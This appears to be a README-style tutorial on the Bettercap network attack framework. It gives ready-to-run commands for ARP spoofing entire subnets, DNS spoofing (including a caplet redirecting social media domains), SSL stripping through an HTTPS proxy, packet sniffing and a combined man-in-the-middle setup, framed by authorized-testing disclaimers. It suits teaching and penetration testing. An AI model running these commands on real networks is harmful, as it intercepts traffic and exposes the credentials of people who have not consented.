# 🎮 Bettercap Mastery Guide

[![Security](https://img.shields.io/badge/Security-Educational-red.svg)](https://github.com/bettercap/bettercap)
[![License](https://img.shields.io/badge/License-Educational%20Use-blue.svg)](#disclaimer)
[![Network](https://img.shields.io/badge/Network-Penetration%20Testing-green.svg)](https://bettercap.org)

> A comprehensive guide to mastering Bettercap for network security assessments and authorized penetration testing.

## ⚠️ **CRITICAL DISCLAIMER**

**This guide is for educational purposes and authorized penetration testing ONLY.**

Bettercap is a powerful network security tool that should only be used on networks you own or have explicit written permission to test. **Unauthorized network attacks are illegal and unethical.**

## 🎯 What is Bettercap?

Bettercap is a comprehensive, modular MITM (Man-in-the-Middle) framework for network security assessments. It provides:

- **Network Discovery** - Identify active devices
- **MITM Attacks** - Intercept network traffic  
- **Traffic Analysis** - Analyze captured data
- **Web Interface** - Real-time monitoring dashboard

## 📦 Installation

### Prerequisites
```bash
# Update system and install dependencies
sudo apt update
sudo apt install -y build-essential libpcap-dev libusb-1.0-0-dev pkg-config git ruby-dev libnetfilter-queue-dev golang
```

### Install Bettercap
```bash
# Clone repository
cd ~
git clone https://github.com/bettercap/bettercap.git

# Build and install
cd bettercap
make build
sudo make install
```

### Alternative: Package Manager
```bash
# Ubuntu/Debian
sudo apt install bettercap

# Arch Linux
sudo pacman -S bettercap

# macOS
brew install bettercap
```

## 🚀 Quick Start

### Basic Network Discovery
```bash
# Start bettercap with network interface
sudo bettercap -iface wlan0

# In bettercap console:
net.probe on
net.recon on
net.show
```

### Essential Commands
```bash
help                    # Show all modules
help <module>          # Get module info
net.probe on           # Start network discovery
net.recon on           # Start network reconnaissance
net.show               # Display discovered hosts
arp.spoof on           # Start ARP spoofing
dns.spoof on           # Start DNS spoofing
net.sniff on           # Start packet capture
events.stream on       # Start event logging
ui.enable              # Enable web interface
```

## 🔧 Core Modules

### 🎯 ARP Spoofing
Intercept traffic by poisoning ARP tables:
```bash
# Target specific host
set arp.spoof.targets 192.168.1.100
arp.spoof on

# Target entire subnet
set arp.spoof.targets 192.168.1.0/24
set arp.spoof.internal true
arp.spoof on
```

### 🌐 DNS Spoofing
Redirect domain queries to specified IP addresses:
```bash
# Redirect specific domain
set dns.spoof.domains facebook.com
set dns.spoof.address 142.250.190.14
dns.spoof on

# Block website (redirect to localhost)
set dns.spoof.domains malicious-site.com
set dns.spoof.address 127.0.0.1
dns.spoof on
```

### 📡 Packet Sniffing
Capture and analyze network traffic:
```bash
# Basic packet capture
net.sniff on

# Verbose logging to file
set net.sniff.verbose true
set net.sniff.output /tmp/capture.pcap
net.sniff on
```

### 🔐 HTTPS Proxy
Intercept SSL/TLS traffic:
```bash
# Enable HTTPS proxy with SSL stripping
set https.proxy.sslstrip true
https.proxy on

# Custom certificate
set https.proxy.certificate /path/to/cert.pem
set https.proxy.key /path/to/key.pem
https.proxy on
```

## 🧪 Advanced Techniques

### Full MITM Attack Setup
```bash
# Complete MITM configuration
set arp.spoof.targets 192.168.1.0/24
set arp.spoof.internal true
arp.spoof on

# Start packet capture
net.sniff on

# Enable HTTPS proxy
set https.proxy.sslstrip true
https.proxy on

# DNS spoofing for specific domains
set dns.spoof.domains example.com
set dns.spoof.address 192.168.1.200
dns.spoof on
```

### Advanced Logging
```bash
# Comprehensive logging setup
set net.sniff.verbose true
set net.sniff.output /tmp/network_capture.pcap
set events.stream.output /tmp/bettercap_events.log

net.sniff on
events.stream on
```

## 🖥️ Web Interface

Enable the real-time web dashboard:
```bash
# Update and enable web UI
caplets.update
ui.update
ui.enable

# Access at: https://localhost:8080
# Default credentials: user/pass
```

**Web Interface Features:**
- Real-time network mapping
- Live traffic monitoring  
- Module control panels
- Event logging dashboard
- Interactive network graph

## 📜 Caplets (Batch Scripts)

Create reusable attack scenarios with caplets:

### Basic MITM Caplet
Create `mitm.cap`:
```bash
# mitm.cap - Basic MITM setup
set arp.spoof.internal true
set arp.spoof.targets 192.168.1.0/24
arp.spoof on
net.sniff on
ui.enable
```

Run caplet:
```bash
sudo bettercap -iface wlan0 -caplet mitm.cap
```

### DNS Spoofing Caplet  
Create `dns_redirect.cap`:
```bash
# dns_redirect.cap - Redirect social media
set dns.spoof.domains facebook.com,twitter.com,instagram.com
set dns.spoof.address 192.168.1.100
dns.spoof on
ui.enable
```

## 🔧 Troubleshooting

### Common Issues & Solutions

**Permission Issues:**
```bash
# Enable capabilities for non-root execution
sudo setcap cap_net_raw,cap_net_admin+eip /usr/local/bin/bettercap
```

**IP Forwarding:**
```bash
# Enable IP forwarding (required for MITM)
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Make permanent
echo 'net.ipv4.ip_forward=1' | sudo tee -a /etc/sysctl.conf
```

**Interface Issues:**
```bash
# Check available interfaces
ip addr show
iwconfig

# Monitor mode (for WiFi)
sudo airmon-ng start wlan0
```

**Dependencies:**
```bash
# Install missing dependencies
sudo apt install -y libpcap-dev libnetfilter-queue-dev
```

## 🔄 Cleanup & Reset

### Stop All Attacks
```bash
# Stop all active modules
net.recon off
arp.spoof off  
dns.spoof off
net.sniff off
https.proxy off
http.proxy off

# Or simply exit
exit
# OR press Ctrl+C
```

### Restore Network Settings
```bash
# Disable IP forwarding
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward

# Flush ARP tables (on target machines)
sudo ip neigh flush all
```

## 📚 Learning Path

### Beginner
1. ✅ Install and basic setup
2. ✅ Network discovery (`net.probe`, `net.recon`)  
3. ✅ Basic ARP spoofing
4. ✅ Web interface exploration

### Intermediate  
5. ✅ DNS spoofing techniques
6. ✅ Packet capture and analysis
7. ✅ HTTPS proxy setup
8. ✅ Custom caplet creation

### Advanced
9. ✅ Combined attack scenarios
10. ✅ Custom modules and scripting
11. ✅ Advanced evasion techniques
12. ✅ Large-scale network assessments

## 🛡️ Ethical Guidelines

- **Only test networks you own or have written permission to test**
- **Obtain proper authorization before any security testing**  
- **Use findings to improve security, not cause harm**
- **Respect privacy and confidentiality**
- **Follow responsible disclosure practices**
- **Stay within legal boundaries of your jurisdiction**

## 📖 Additional Resources

- **Official Documentation:** https://bettercap.org
- **GitHub Repository:** https://github.com/bettercap/bettercap  
- **Community Wiki:** https://github.com/bettercap/bettercap/wiki
- **Caplets Collection:** https://github.com/bettercap/caplets

## 🤝 Contributing

Contributions are welcome! Please read the [contributing guidelines](https://github.com/bettercap/bettercap/blob/master/CONTRIBUTING.md) before submitting PRs.

## 📄 License

This guide is for educational purposes. Bettercap is licensed under GPL-3.0. See [LICENSE](https://github.com/bettercap/bettercap/blob/master/LICENSE) for details.

---

**⚡ Remember: With great power comes great responsibility. Use these tools ethically and legally.**
